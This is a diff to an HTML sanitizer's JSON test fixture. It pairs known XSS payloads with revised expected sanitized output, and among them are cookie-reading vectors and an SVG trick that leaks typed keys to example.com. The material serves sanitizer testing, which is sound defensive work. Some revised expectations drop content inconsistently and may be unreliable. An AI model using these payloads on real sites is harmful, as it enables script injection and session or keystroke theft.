@@ -177,7 +177,7 @@
   {
     "title": "Iframe inside option element",
     "payload": "<option><iframe></select><b><script>alert(1)</script>",
-    "expected": "<option>&lt;iframe&gt;&lt;/select><b>alert&#40;1&#41;"
+    "expected": "<option>&lt;iframe&gt;&lt;/select><b>"
   },
   {
     "title": "Closing Iframe and option",
@@ -273,15 +273,15 @@
   },
   {
     "payload": "<div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"4\">0?Worker(\"#\").=function(_)eval&#40;_.data&#41; :postMessage(importScripts(cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"4\">0? :postMessage(importScripts(cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"5\">crypto.generateCRMFRequest('CN=0',0,0,null,'alert&#40;5&#41;',384,null,'rsa-dual-use')//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"5\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"6\">({set/**/$($){_/**/setter=$,_=1}}).$=alert//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"6\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div>",
@@ -313,7 +313,7 @@
   },
   {
     "payload": "<div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"15\">({0:#0=alert/#0#/#0#(0)})//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"15\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div>",
@@ -325,7 +325,7 @@
   },
   {
     "payload": "<div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"18\">alert&#40;1&#41;//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"18\">alert&#40;1&#41;]</div>"
   },
   {
     "payload": "<div id=\"19\"><meta charset=\"x-mac-farsi\">\u00BCscript \u00BEalert(19)//\u00BC/script \u00BE//[\"'`-->]]>]</div>",
@@ -333,11 +333,11 @@
   },
   {
     "payload": "<div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"20\">ReferenceError.prototype.__defineGetter__('name', function(){alert&#40;20&#41;}),x//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"20\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"21\">Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert&#40;21&#41;')()//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"21\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div>",
@@ -353,7 +353,7 @@
   },
   {
     "payload": "<div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"25\">{alert&#40;25&#41;};1//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"25\">{alert&#40;25&#41;}]</div>"
   },
   {
     "payload": "<div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div>",
@@ -449,11 +449,11 @@
   },
   {
     "payload": "<div id=\"47\"><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(47)</script></svg>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"47\">&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;alert&#40;47&#41;&lt;/svg&gt;//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"47\">&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;&lt;/svg>//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"48\"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"48\">alert&#40;48&#41;//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"48\">alert&#40;48&#41;]</div>"
   },
   {
     "payload": "<div id=\"49\"><OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(49)\"></OBJECT>//[\"'`-->]]>]</div>",
@@ -477,7 +477,7 @@
   },
   {
     "payload": "<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"54\">[{'a':Object.prototype.__defineSetter__('b',function(){alert&#40;arguments[0]&#41;}),'b':['secret']}]//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"54\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"55\"><video><source onerror=\"alert(55)\">//[\"'`-->]]>]</div>",
@@ -489,7 +489,7 @@
   },
   {
     "payload": "<div id=\"57\"><b <script>alert(57)//</script>0</script></b>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"57\"><b alert&#40;57&#41;//0</b>//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"57\"><b 0//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"58\"><b><script<b></b><alert(58)</script </b></b>//[\"'`-->]]>]</div>",
@@ -497,7 +497,7 @@
   },
   {
     "payload": "<div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"59\"><div id=\"div1\">&lt;input value=\"``=alert&#40;59&#41;\"&gt;&lt;/div> <div id=\"div2\"></div>document.getElementById(\"div2\") = document.getElementById(\"div1\");//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"59\"><div id=\"div1\">&lt;input value=\"``=alert&#40;59&#41;\"&gt;&lt;/div> <div id=\"div2\"></div>//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`-->]]>]</div>",
@@ -513,7 +513,7 @@
   },
   {
     "payload": "<div id=\"63\"><embed src=\"javascript:alert(63)\"></embed> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img src=\"javascript:alert(2)\">\n<image src=\"javascript:alert(2)\"> // IE6, O10.10\u2193, OM10.0\u2193\n<script src=\"javascript:alert(3)\"></script> // IE6, O11.01\u2193, OM10.1\u2193//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"63\">&lt;embed src=\"alert&#40;63&#41;\"&gt;&lt;/embed> // O10.10↓, OM10.0↓, GC6↓, FF\n<img src=\"\">\n<image src=\"alert&#40;2&#41;\"> // IE6, O10.10↓, OM10.0↓\n // IE6, O11.01↓, OM10.1↓//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"63\">&lt;embed src=\"alert&#40;63&#41;\"&gt;&lt;/embed> // O10.10↓, OM10.0↓, GC6↓, FF\n<img src=\"\">\n<image src=\"alert&#40;2&#41;\"> // IE6, O10.10↓, OM10.0↓\n]</div>"
   },
   {
     "payload": "<div id=\"64\"><!DOCTYPE x[<!ENTITY x SYSTEM \"http://html5sec.org/test.xxe\">]><y>&x;</y>//[\"'`-->]]>]</div>",
@@ -613,7 +613,7 @@
   },
   {
     "payload": "<div id=\"91\">[A]\n<? foo=\"><script>alert(91)</script>\">\n<! foo=\"><script>alert(91)</script>\">\n</ foo=\"><script>alert(91)</script>\">\n[B]\n<? foo=\"><x foo='?><script>alert(91)</script>'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo><script>alert(91)</script>\">\n[D]\n<% foo><x foo=\"%><script>alert(91)</script>\">//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"91\">[A]\n&lt;? foo=\">alert&#40;91&#41;\">\n<! foo=\">alert&#40;91&#41;\">\n</ foo=\">alert&#40;91&#41;\">\n[B]\n&lt;? foo=\"><x foo='?&gt;alert&#40;91&#41;'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo>alert&#40;91&#41;\">\n[D]\n<% foo><x foo=\"%>alert&#40;91&#41;\">//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"91\">[A]\n&lt;? foo=\">\">\n<! foo=\">\">\n</ foo=\">\">\n[B]\n&lt;? foo=\"><x foo='?&gt;'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo>\">\n[D]\n<% foo><x foo=\"%>\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>",
@@ -637,11 +637,11 @@
   },
   {
     "payload": "<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"97\">&lt;!-- IE 5-9 --&gt;\n<div id=d><x xmlns=\">&lt;iframe \"&gt;&lt;/div&gt;\nd+='';\n&lt;!-- IE 10 in IE5-9 Standards mode --&gt;\n&lt;div id=d&gt;&lt;x xmlns='\"&gt;&lt;iframe '&gt;&lt;/div&gt;\nd+='';//[\"'`--&gt;]]&gt;]&lt;/div>"
+    "expected": "<div id=\"97\">&lt;!-- IE 5-9 --&gt;\n<div id=d><x xmlns=\">&lt;iframe \"&gt;&lt;/div&gt;\n\n&lt;!-- IE 10 in IE5-9 Standards mode --&gt;\n&lt;div id=d&gt;&lt;x xmlns='\"&gt;&lt;iframe '&gt;&lt;/div&gt;\n//[\"'`--&gt;]]&gt;]&lt;/div>"
   },
   {
     "payload": "<div id=\"98\"><div id=d><div style=\"font-family:'sans\u0017\u0002F\u0002A\u0012\u0002A\u0002F\u0003B color\u0003Ared\u0003B'\">X</div></div>\n<script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"98\"><div id=d><div >X</div></div>\nwith(document.getElementById(\"d\"))innerHTML=innerHTML//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"98\"><div id=d><div >X</div></div>\n//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"99\">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */\n\n</style>//[\"'`-->]]>]</div>",
@@ -657,11 +657,11 @@
   },
   {
     "payload": "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"102\"><img src=\"\">//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"102\"><img src=\"x` `\">//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar\"/>\n</svg>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"103\">history.pushState(0,0,'/i/am/somewhere_else');//[\"'`--&gt;]]>]</div><div id=\"104\">&lt;svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\"&gt;\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;\n&lt;handler xml:id=\"bar\" type=\"application/ecmascript\"&gt; alert&#40;104&#41; &lt;/handler&gt;\n&lt;/svg&gt;\n#bar\"/&gt;\n&lt;/svg&gt;//[\"'`--&gt;]]&gt;]&lt;/div&gt;"
+    "expected": "<div id=\"103\">//[\"'`--&gt;]]>]</div><div id=\"104\">&lt;svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\"&gt;\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;\n&lt;handler xml:id=\"bar\" type=\"application/ecmascript\"&gt; alert&#40;104&#41; &lt;/handler&gt;\n&lt;/svg&gt;\n#bar\"/&gt;\n&lt;/svg&gt;//[\"'`--&gt;]]&gt;]&lt;/div&gt;"
   },
   {
     "payload": "<div id=\"105\"><iframe src=\"data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03\"></iframe>//[\"'`-->]]>]</div>",
@@ -697,7 +697,7 @@
   },
   {
     "payload": "<div id=\"114\"><x style=\"background:url('x[a];color:red;/*')\">XXX</x>//[\"'`-->]]>]</div><div id=\"115\"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"114\"><x >XXX</x>//[\"'`--&gt;]]>]</div><div id=\"115\">&lt;!--[if]>alert&#40;115&#41; --&gt;//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"114\"><x >XXX</x>//[\"'`--&gt;]]>]</div><div id=\"115\">&lt;!--[if]> --&gt;//[\"'`--&gt;]]>]</div>"
   },
   {
     "title": "XML",
@@ -726,7 +726,7 @@
   {
     "title": "window.open",
     "payload": "<div id=\"120\"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n</script>\n<body>\n<a href=\"#\" onclick=\"makePopups()\">Spam</a>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"120\">\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n\n&lt;body&gt;\n<a href=\"#\">Spam</a>//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"120\">\n&lt;body&gt;\n<a href=\"#\">Spam</a>//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"121\"><html xmlns=\"http://www.w3.org/1999/xhtml\"\nxmlns:svg=\"http://www.w3.org/2000/svg\">\n<body style=\"background:gray\">\n<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"/>\n<svg:svg>\n<svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\">\n    <svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/>\n    <svg:circle cx=\"0.45\" cy=\"0.7\" r=\"0.075\" fill=\"white\"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//[\"'`-->]]>]</div>",
@@ -739,7 +739,7 @@
   },
   {
     "payload": "<div id=\"124\"><script src=\"/example.com\foo.js\"></script> // Safari 5.0, Chrome 9, 10\n<script src=\"\\example.com\foo.js\"></script> // Safari 5.0//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"124\"> // Safari 5.0, Chrome 9, 10\n // Safari 5.0//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"124\"> // Safari 5.0//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"125\"><?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xml\" href=\"#stylesheet\"?>\n<!DOCTYPE doc [\n<!ATTLIST xsl:stylesheet\n  id    ID    #REQUIRED>]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n    <xsl:stylesheet id=\"stylesheet\" version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n        <xsl:template match=\"/\">\n            <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(125)\"></iframe>\n        </xsl:template>\n    </xsl:stylesheet>\n    <circle fill=\"red\" r=\"40\"></circle>\n</svg>//[\"'`-->]]>]</div>",
@@ -770,7 +770,7 @@
   {
     "title": "jAvascript (case sensitive)",
     "payload": "<div id=\"131\"><b>drag and drop one of the following strings to the drop box:</b>\n<br/><hr/>\njAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br/><hr/>\nfeed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br/><hr/>\nfeed:data:text/html,<script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)</script><b>\n<br/><hr/>\nfeed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br/><hr/>\n<div id=\"dropbox\" style=\"height: 360px;width: 500px;border: 5px solid #000;position: relative;\" ondragover=\"event.preventDefault()\">+ Drop Box +</div>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"131\"><b>drag and drop one of the following strings to the drop box:</b>\n<br/><hr/>\nalert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;;//\n<br/><hr/>\nfeed:alert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;;//\n<br/><hr/>\nfeed:data:text/html,alert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;<b>\n<br/><hr/>\nfeed:feed:feed:alert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;;//\n<br/><hr/>\n<div id=\"dropbox\"  >+ Drop Box +</div>//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"131\"><b>drag and drop one of the following strings to the drop box:</b>\n<br/><hr/>\nalert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;;//\n<br/><hr/>\nfeed:alert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;;//\n<br/><hr/>\nfeed:data:text/html,<b>\n<br/><hr/>\nfeed:feed:feed:alert&#40;'Top Page Location: '++' Host Page Cookies: '+&#41;;//\n<br/><hr/>\n<div id=\"dropbox\"  >+ Drop Box +</div>//[\"'`--&gt;]]>]</div>"
   },
   {
     "payload": "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>",
@@ -783,7 +783,7 @@
   {
     "title": "XMP",
     "payload": "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>",
-    "expected": "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img ></><>\n\n<>\nx='%'>/\nalert&#40;2&#41;\n\n\nXXX\n&lt;style&gt;\n*['&lt;!--']{}\n&lt;/style&gt;\n--&gt;{}\n*{color:red}&lt;/style&gt;//[\"'`--&gt;]]>]</div>"
+    "expected": "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img ></><>\n\n<>\nx='%'>\n--&gt;{}\n*{color:red}&lt;/style&gt;//[\"'`--&gt;]]>]</div>"
   },
   {
     "title": "SVG",
